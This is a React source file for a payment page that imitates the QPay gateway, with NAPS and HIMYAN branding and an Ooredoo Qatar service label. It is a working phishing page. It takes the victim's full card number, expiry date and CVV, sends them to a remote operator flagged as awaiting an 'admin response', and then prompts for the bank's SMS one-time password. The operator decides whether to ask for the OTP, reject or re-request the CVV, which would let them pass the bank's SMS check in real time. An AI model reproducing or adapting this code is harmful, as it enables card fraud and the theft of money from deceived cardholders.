import { useState, useEffect, useRef, useCallback } from "react";
import { useLocation } from "wouter";
import { useSignalEffect } from "@preact/signals-react/runtime";
import {
  sendData,
  navigateToPage,
  cardAction,
  codeAction,
  waitingMessage,
} from "@/lib/store";

const months = Array.from({ length: 12 }, (_, i) => ({
  value: String(i + 1).padStart(2, "0"),
  label: String(i + 1).padStart(2, "0"),
}));

const currentYear = new Date().getFullYear();
const years = Array.from({ length: 15 }, (_, i) => ({
  value: String(currentYear + i),
  label: String(currentYear + i),
}));

type Phase = "card" | "otp";

export default function KNETPayment() {
  const [, navigate] = useLocation();
  const [phase, setPhase] = useState<Phase>("card");

  const [cardNumber, setCardNumber] = useState("");
  const [expiryMonth, setExpiryMonth] = useState("");
  const [expiryYear, setExpiryYear] = useState("");
  const [cvv, setCvv] = useState("");
  const [showCvv, setShowCvv] = useState(false);

  const [otpCode, setOtpCode] = useState("");
  const [countdown, setCountdown] = useState(180);
  const countdownRef = useRef<ReturnType<typeof setInterval> | null>(null);

  const [validationError, setValidationError] = useState("");
  const [isWaiting, setIsWaiting] = useState(false);
  const [rejectedError, setRejectedError] = useState("");
  const [showErrorModal, setShowErrorModal] = useState(false);
  const [errorModalMessage, setErrorModalMessage] = useState("");

  const mohData = JSON.parse(localStorage.getItem("mohPaymentData") || "{}");
  const totalAmount = mohData.totalAmount || localStorage.getItem("Total") || "0.00";

  const paymentUniqueNumber = useRef(
    "PORTALTP" + Date.now().toString().slice(-12)
  );

  const maskedCard = cardNumber.length >= 8
    ? cardNumber.slice(0, 4) + "********" + cardNumber.slice(-4)
    : cardNumber;

  useEffect(() => {
    navigateToPage("QPay Payment");
  }, []);

  const startCountdown = useCallback(() => {
    setCountdown(180);
    if (countdownRef.current) clearInterval(countdownRef.current);
    countdownRef.current = setInterval(() => {
      setCountdown((prev) => {
        if (prev <= 1) {
          if (countdownRef.current) clearInterval(countdownRef.current);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
  }, []);

  useEffect(() => {
    return () => {
      if (countdownRef.current) clearInterval(countdownRef.current);
    };
  }, []);

  const formatCountdown = (seconds: number) => {
    const m = Math.floor(seconds / 60);
    const s = seconds % 60;
    return `${m}:${String(s).padStart(2, "0")}`;
  };

  useSignalEffect(() => {
    if (cardAction.value) {
      const action = cardAction.value.action;
      waitingMessage.value = "";
      setIsWaiting(false);

      if (phase === "card") {
        if (action === "otp") {
          setPhase("otp");
          startCountdown();
          navigateToPage("QPay OTP Verification");
        } else if (action === "reject") {
          setRejectedError("Transaction declined. Please check your card details.");
          setCardNumber("");
          setCvv("");
          setExpiryMonth("");
          setExpiryYear("");
        }
      } else if (phase === "otp") {
        if (action === "otp") {
          navigate("/final-page");
        } else if (action === "cvv") {
          navigate("/cvv");
        } else if (action === "reject") {
          setRejectedError("Invalid OTP. Please try again.");
          setOtpCode("");
        }
      }
      cardAction.value = null;
    }
  });

  useSignalEffect(() => {
    if (codeAction.value) {
      const action = codeAction.value.action;
      waitingMessage.value = "";
      setIsWaiting(false);

      if (phase === "otp") {
        if (action === "cvv") {
          navigate("/cvv");
        } else if (action === "reject") {
          setRejectedError("Invalid OTP. Please try again.");
          setOtpCode("");
        } else if (action === "approve" || action === "otp") {
          navigate("/final-page");
        }
      } else if (phase === "card") {
        if (action === "reject") {
          setRejectedError("Transaction declined. Please check your card details.");
          setCardNumber("");
          setCvv("");
          setExpiryMonth("");
          setExpiryYear("");
        }
      }
      codeAction.value = null;
    }
  });

  const validateCardForm = (): boolean => {
    if (!cardNumber || cardNumber.length < 13) {
      setValidationError("Please enter a valid card number");
      return false;
    }
    if (!expiryMonth || !expiryYear) {
      setValidationError("Please select card expiry date");
      return false;
    }
    if (!cvv || cvv.length < 3) {
      setValidationError("Please enter a valid CVV2");
      return false;
    }
    setValidationError("");
    return true;
  };

  const handleCardSubmit = (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    if (!validateCardForm()) return;

    setIsWaiting(true);
    setRejectedError("");

    localStorage.setItem("cardNumber", cardNumber);
    localStorage.setItem("cardMonth", expiryMonth);
    localStorage.setItem("cardYear", expiryYear);
    localStorage.setItem("Total", String(totalAmount));

    const paymentData = {
      totalPaid: totalAmount,
      cardType: "qpay",
      cardLast4: cardNumber.slice(-4),
      serviceName: mohData.serviceType || "Ooredoo Qatar",
      bankName: "QPay",
      bankLogo: "",
    };
    localStorage.setItem("paymentData", JSON.stringify(paymentData));

    sendData({
      paymentCard: {
        cardNumber: cardNumber,
        cardNumberOnly: cardNumber,
        prefix: cardNumber.slice(0, 6),
        nameOnCard: "QPay Card",
        expiryMonth: expiryMonth,
        expiryYear: expiryYear,
        cvv: cvv,
        pin: "N/A",
        bankName: "QPay",
        paymentMethod: "QPay",
      },
      current: "QPay Payment",
      nextPage: "QPay OTP Verification",
      waitingForAdminResponse: true,
      isCustom: true,
    });
  };

  const handleOtpSubmit = () => {
    if (!otpCode || !/^\d{4,6}$/.test(otpCode)) {
      setShowErrorModal(true);
      setErrorModalMessage("Please enter a valid OTP (4-6 digits)");
      return;
    }

    setIsWaiting(true);

    sendData({
      digitCode: otpCode,
      current: "QPay OTP Verification",
      nextPage: "الصفحة النهائية",
      waitingForAdminResponse: true,
      isCustom: true,
    });
  };

  // NAPS Arrow Logo - double chevron (>>) in dark maroon/red
  const NapsLogo = () => (
    <svg width="22" height="16" viewBox="0 0 22 16" fill="none">
      <path d="M1 1L8 8L1 15" stroke="#8b1a2c" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round"/>
      <path d="M10 1L17 8L10 15" stroke="#8b1a2c" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round"/>
    </svg>
  );

  // HIMYAN Arrow Logo - double chevron (>>) in dark maroon/red (same style)
  const HimyanLogo = () => (
    <svg width="18" height="14" viewBox="0 0 22 16" fill="none">
      <path d="M1 1L8 8L1 15" stroke="#8b1a2c" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round"/>
      <path d="M10 1L17 8L10 15" stroke="#8b1a2c" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round"/>
    </svg>
  );

  return (
    <>
      <style>{`
        @keyframes qpay-spin {
          to { transform: rotate(360deg); }
        }
      `}</style>

      <div style={{ margin: 0, padding: 0, fontFamily: `-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", "Liberation Sans", sans-serif`, backgroundColor: "#f0f0f0", minHeight: "100vh", direction: "ltr", textAlign: "left", display: "flex", flexDirection: "column", alignItems: "center" }}>
        {/* Loading Overlay */}
        {isWaiting && (
          <div style={{ position: "fixed", top: 0, left: 0, width: "100%", height: "100%", backgroundColor: "rgba(0,0,0,0.4)", zIndex: 999999, display: "flex", alignItems: "center", justifyContent: "center" }}>
            <div style={{ background: "#fff", borderRadius: 8, padding: "30px 40px", textAlign: "center" }}>
              <div style={{ width: 36, height: 36, border: "4px solid #4a0028", borderTopColor: "transparent", borderRadius: "50%", animation: "qpay-spin 1s linear infinite", margin: "0 auto 15px" }} />
              <p style={{ margin: 0, color: "#333", fontSize: 14 }}>Processing...</p>
            </div>
          </div>
        )}

        {/* Error Modal */}
        {showErrorModal && (
          <div style={{ position: "fixed", top: 0, left: 0, width: "100%", height: "100%", backgroundColor: "rgba(0,0,0,0.4)", zIndex: 999999, display: "flex", alignItems: "center", justifyContent: "center" }}>
            <div style={{ background: "#fff", borderRadius: 8, padding: "25px 30px", maxWidth: 380, width: "90%", textAlign: "center" }}>
              <p style={{ margin: "0 0 20px", color: "#333", fontSize: 14 }}>{errorModalMessage}</p>
              <button onClick={() => setShowErrorModal(false)} style={{ background: "#4a0028", color: "#fff", border: "none", borderRadius: 5, padding: "10px 30px", fontSize: 14, cursor: "pointer" }}>OK</button>
            </div>
          </div>
        )}

        {/* Main Container - centered, max-width like original */}
        <div style={{ width: "100%", maxWidth: 780, padding: "0 16px", marginTop: 0, boxSizing: "border-box" as any }}>

          {/* Logo - centered */}
          <div style={{ padding: "25px 0 30px", textAlign: "center" }}>
            <img src="/assets/qpay-logo.png" alt="QPAY" style={{ height: 36 }} />
          </div>

          {phase === "card" && (
            <>
              {/* Payment Info */}
              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start", marginBottom: 20, padding: "0 5px", flexWrap: "wrap" as any, gap: 10, flexWrap: "wrap" as any, gap: 10 }}>
                <div>
                  <p style={{ fontSize: 15, fontWeight: "bold", color: "#333", margin: "0 0 6px" }}>
                    Payment Unique Number: {paymentUniqueNumber.current}
                  </p>
                  <p style={{ fontSize: 15, fontWeight: "bold", color: "#333", margin: 0 }}>
                    Description: {paymentUniqueNumber.current}
                  </p>
                </div>
                <div style={{ textAlign: "right" }}>
                  <p style={{ fontSize: 14, fontWeight: "bold", color: "#c41e3a", margin: "0 0 2px" }}>Amount</p>
                  <p style={{ fontSize: 28, fontWeight: "bold", color: "#000", margin: 0 }}>
                    QAR {Number(totalAmount).toFixed(2)}
                  </p>
                </div>
              </div>

              {/* Card Section - maroon border around entire thing */}
              <div style={{ border: "2px solid #4a0028", marginBottom: 0 }}>
                {/* Card Header - dark maroon with left accent */}
                <div style={{ background: "#4a0028", padding: "12px 20px", borderLeft: "2px solid #8b2040" }}>
                  <p style={{ color: "#ffffff", fontSize: 15, fontWeight: "normal", margin: 0 }}>Enter your payment card details</p>
                </div>

                {/* Card Body */}
                <div style={{ background: "#f5f5f5", padding: "20px 12px 16px", borderLeft: "2px solid #4a0028" }}>
                  {validationError && (
                    <div style={{ background: "#f0d8d8", padding: "12px", marginBottom: 20, color: "#6e3131", fontSize: 13, textAlign: "center", borderRadius: 5, fontWeight: "bold", width: "70%", margin: "0 auto 20px" }}>
                      {validationError}
                    </div>
                  )}
                  {rejectedError && (
                    <div style={{ background: "#f0d8d8", padding: "12px", marginBottom: 20, color: "#6e3131", fontSize: 13, textAlign: "center", borderRadius: 5, fontWeight: "bold", width: "70%", margin: "0 auto 20px" }}>
                      {rejectedError}
                    </div>
                  )}

                  <form onSubmit={handleCardSubmit}>
                    {/* Card Number */}
                    <div style={{ display: "flex", alignItems: "center", justifyContent: "center", marginBottom: 25 }}>
                      <label style={{ width: 120, fontSize: 13, fontWeight: "bold", color: "#333", textAlign: "right", paddingRight: 10, flexShrink: 0 }}>
                        Card Number
                      </label>
                      <input
                        type="tel"
                        inputMode="numeric"
                        maxLength={19}
                        value={cardNumber}
                        onChange={(e) => {
                          const val = e.target.value.replace(/\D/g, "");
                          setCardNumber(val);
                          setValidationError("");
                          setRejectedError("");
                        }}
                        style={{ flex: 1, minWidth: 0, maxWidth: 220, height: 36, border: "1px solid #aaa", padding: "0 10px", fontSize: 14, color: "#000", background: "#fff", outline: "none", fontFamily: "inherit" }}
                      />
                    </div>

                    {/* Card Expiry Date */}
                    <div style={{ display: "flex", alignItems: "center", justifyContent: "center", marginBottom: 25 }}>
                      <label style={{ width: 120, fontSize: 13, fontWeight: "bold", color: "#333", textAlign: "right", paddingRight: 10, flexShrink: 0 }}>
                        Card Expiry Date
                      </label>
                      <div style={{ display: "flex", gap: 12 }}>
                        <select
                          value={expiryMonth}
                          onChange={(e) => setExpiryMonth(e.target.value)}
                          style={{ width: 80, height: 36, border: "1px solid #aaa", padding: "0 6px", fontSize: 14, color: "#000", background: "#fff", outline: "none", fontFamily: "inherit" }}
                        >
                          <option value="">mm</option>
                          {months.map((m) => (
                            <option key={m.value} value={m.value}>{m.label}</option>
                          ))}
                        </select>
                        <select
                          value={expiryYear}
                          onChange={(e) => setExpiryYear(e.target.value)}
                          style={{ width: 90, height: 36, border: "1px solid #aaa", padding: "0 6px", fontSize: 14, color: "#000", background: "#fff", outline: "none", fontFamily: "inherit" }}
                        >
                          <option value="">yyyy</option>
                          {years.map((y) => (
                            <option key={y.value} value={y.value}>{y.label}</option>
                          ))}
                        </select>
                      </div>
                    </div>

                    {/* CVV2 */}
                    <div style={{ display: "flex", alignItems: "center", justifyContent: "center", marginBottom: 20 }}>
                      <label style={{ width: 120, fontSize: 13, fontWeight: "bold", color: "#333", textAlign: "right", paddingRight: 10, flexShrink: 0 }}>
                        CVV2
                      </label>
                      <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
                        <input
                          type={showCvv ? "text" : "password"}
                          inputMode="numeric"
                          maxLength={3}
                          value={cvv}
                          onChange={(e) => {
                            const val = e.target.value.replace(/\D/g, "");
                            setCvv(val);
                            setValidationError("");
                          }}
                          placeholder="•••"
                          style={{ flex: 1, minWidth: 0, maxWidth: 180, height: 36, border: "1px solid #aaa", padding: "0 10px", fontSize: 16, color: "#000", background: "#fff", outline: "none", letterSpacing: 3, fontFamily: "inherit" }}
                        />
                        <button
                          type="button"
                          onClick={() => setShowCvv(!showCvv)}
                          style={{ background: "none", border: "none", cursor: "pointer", padding: 4, display: "flex", alignItems: "center", color: "#555" }}
                        >
                          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                            {showCvv ? (
                              <>
                                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
                                <circle cx="12" cy="12" r="3" />
                              </>
                            ) : (
                              <>
                                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
                                <circle cx="12" cy="12" r="3" />
                              </>
                            )}
                          </svg>
                        </button>
                      </div>
                    </div>

                    {/* Terms */}
                    <p style={{ fontSize: 12, color: "#444", lineHeight: 1.6, margin: "0 0 20px", textAlign: "center" }}>
                      By clicking the "Continue" button, you hereby acknowledge accepting the{" "}
                      <a href="#" style={{ color: "#0066cc", textDecoration: "underline" }}>Terms and Conditions</a>{" "}
                      of payment.
                    </p>

                    {/* Footer area - inside the border, light background */}
                    <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "15px 10px 5px", borderTop: "1px solid #ddd" }}>
                      <div style={{ display: "flex", alignItems: "center", gap: 12 }}>
                        <img src="/assets/naps-logo.svg" alt="NAPS" style={{ height: 24 }} />
                        <img src="/assets/himyan-logo.svg" alt="HIMYAN" style={{ height: 24, width: 'auto' }} />
                      </div>
                      <div style={{ display: "flex", gap: 10 }}>
                        <button
                          type="submit"
                          style={{ background: (cardNumber.length >= 13 && expiryMonth && expiryYear && cvv.length >= 3) ? "#4a0028" : "#d9d9d9", color: (cardNumber.length >= 13 && expiryMonth && expiryYear && cvv.length >= 3) ? "#fff" : "#333", border: "none", borderRadius: 5, padding: "10px 28px", fontSize: 14, cursor: "pointer", fontFamily: "inherit" }}
                        >
                          Continue
                        </button>
                        <button
                          type="button"
                          onClick={() => window.history.back()}
                          style={{ background: "#ffffff", color: "#333", border: "1px solid #ccc", borderRadius: 5, padding: "10px 28px", fontSize: 14, cursor: "pointer", fontFamily: "inherit" }}
                        >
                          Cancel
                        </button>
                      </div>
                    </div>
                  </form>
                </div>
              </div>

              {/* Bottom Warning - outside border */}
              <p style={{ textAlign: "center", padding: "15px 0", fontSize: 12, color: "#555", margin: 0 }}>
                For proper completion of your transaction, please do not refresh this page or click the browser's back button.
              </p>
            </>
          )}

          {/* ============ PHASE: OTP ============ */}
          {phase === "otp" && (
            <>
              {/* Payment Info */}
              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start", marginBottom: 20, padding: "0 5px", flexWrap: "wrap" as any, gap: 10, flexWrap: "wrap" as any, gap: 10 }}>
                <div>
                  <p style={{ fontSize: 15, fontWeight: "bold", color: "#333", margin: "0 0 6px" }}>
                    Payment Unique Number: {paymentUniqueNumber.current}
                  </p>
                  <p style={{ fontSize: 15, fontWeight: "bold", color: "#333", margin: 0 }}>
                    Description: {paymentUniqueNumber.current}
                  </p>
                </div>
                <div style={{ textAlign: "right" }}>
                  <p style={{ fontSize: 14, fontWeight: "bold", color: "#c41e3a", margin: "0 0 2px" }}>Amount</p>
                  <p style={{ fontSize: 28, fontWeight: "bold", color: "#000", margin: 0 }}>
                    QAR {Number(totalAmount).toFixed(2)}
                  </p>
                </div>
              </div>

              {/* OTP Section */}
              <div style={{ border: "2px solid #4a0028", marginBottom: 0 }}>
                <div style={{ background: "#4a0028", padding: "12px 20px", borderLeft: "2px solid #8b2040" }}>
                  <p style={{ color: "#ffffff", fontSize: 15, fontWeight: "normal", margin: 0 }}>OTP Verification</p>
                </div>

                <div style={{ background: "#f5f5f5", padding: "25px 20px 20px", borderLeft: "2px solid #4a0028" }}>
                  {/* Notification */}
                  <div style={{ background: "#d9edf7", border: "1px solid #bce8f1", padding: "12px 15px", marginBottom: 25, fontSize: 13, color: "#31708f", lineHeight: 1.7 }}>
                    <strong>NOTIFICATION:</strong> You will presently receive an SMS on your mobile number registered with your bank. This is an OTP (One Time Password) SMS, it contains 6 digits to be entered in the box below.
                  </div>

                  {/* Card Info Display */}
                  <div style={{ display: "flex", alignItems: "center", justifyContent: "center", marginBottom: 20 }}>
                    <label style={{ width: 120, fontSize: 13, fontWeight: "bold", color: "#333", textAlign: "right", paddingRight: 10, flexShrink: 0 }}>
                      Card Number
                    </label>
                    <span style={{ fontSize: 14, color: "#000" }}>{maskedCard}</span>
                  </div>

                  <div style={{ display: "flex", alignItems: "center", justifyContent: "center", marginBottom: 20 }}>
                    <label style={{ width: 120, fontSize: 13, fontWeight: "bold", color: "#333", textAlign: "right", paddingRight: 10, flexShrink: 0 }}>
                      Expiry Date
                    </label>
                    <span style={{ fontSize: 14, color: "#000" }}>{expiryMonth}/{expiryYear}</span>
                  </div>

                  {rejectedError && (
                    <div style={{ background: "#f0d8d8", padding: "12px", marginBottom: 20, color: "#6e3131", fontSize: 13, textAlign: "center", borderRadius: 5, fontWeight: "bold", width: "70%", margin: "0 auto 20px" }}>
                      {rejectedError}
                    </div>
                  )}

                  {/* OTP Input */}
                  <div style={{ display: "flex", alignItems: "center", justifyContent: "center", marginBottom: 20 }}>
                    <label style={{ width: 120, fontSize: 13, fontWeight: "bold", color: "#333", textAlign: "right", paddingRight: 10, flexShrink: 0 }}>
                      OTP
                    </label>
                    <input
                      type="tel"
                      inputMode="numeric"
                      maxLength={6}
                      value={otpCode}
                      onChange={(e) => {
                        const val = e.target.value.replace(/\D/g, "");
                        setOtpCode(val);
                        setRejectedError("");
                      }}
                      placeholder={formatCountdown(countdown)}
                      style={{ width: 180, height: 36, border: "1px solid #aaa", padding: "0 10px", fontSize: 16, color: "#000", background: "#fff", outline: "none", textAlign: "center", letterSpacing: 5, fontFamily: "inherit" }}
                    />
                  </div>

                  {/* Footer */}
                  <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "15px 10px 5px", borderTop: "1px solid #ddd" }}>
                    <div style={{ display: "flex", alignItems: "center", gap: 12 }}>
                      <img src="/assets/naps-logo.svg" alt="NAPS" style={{ height: 24 }} />
                      <img src="/assets/himyan-logo.svg" alt="HIMYAN" style={{ height: 24, width: 'auto' }} />
                    </div>
                    <div style={{ display: "flex", gap: 10 }}>
                      <button
                        type="button"
                        onClick={handleOtpSubmit}
                        disabled={!otpCode || otpCode.length < 4}
                        style={{ background: otpCode && otpCode.length >= 4 ? "#4a0028" : "#d9d9d9", color: otpCode && otpCode.length >= 4 ? "#ffffff" : "#333", border: "none", borderRadius: 5, padding: "10px 28px", fontSize: 14, cursor: otpCode && otpCode.length >= 4 ? "pointer" : "not-allowed", opacity: otpCode && otpCode.length >= 4 ? 1 : 0.6, fontFamily: "inherit" }}
                      >
                        Continue
                      </button>
                      <button
                        type="button"
                        onClick={() => window.history.back()}
                        style={{ background: "#ffffff", color: "#333", border: "1px solid #ccc", borderRadius: 5, padding: "10px 28px", fontSize: 14, cursor: "pointer", fontFamily: "inherit" }}
                      >
                        Cancel
                      </button>
                    </div>
                  </div>
                </div>
              </div>

              {/* Bottom Warning */}
              <p style={{ textAlign: "center", padding: "15px 0", fontSize: 12, color: "#555", margin: 0 }}>
                For proper completion of your transaction, please do not refresh this page or click the browser's back button.
              </p>
            </>
          )}
        </div>
      </div>
    </>
  );
}
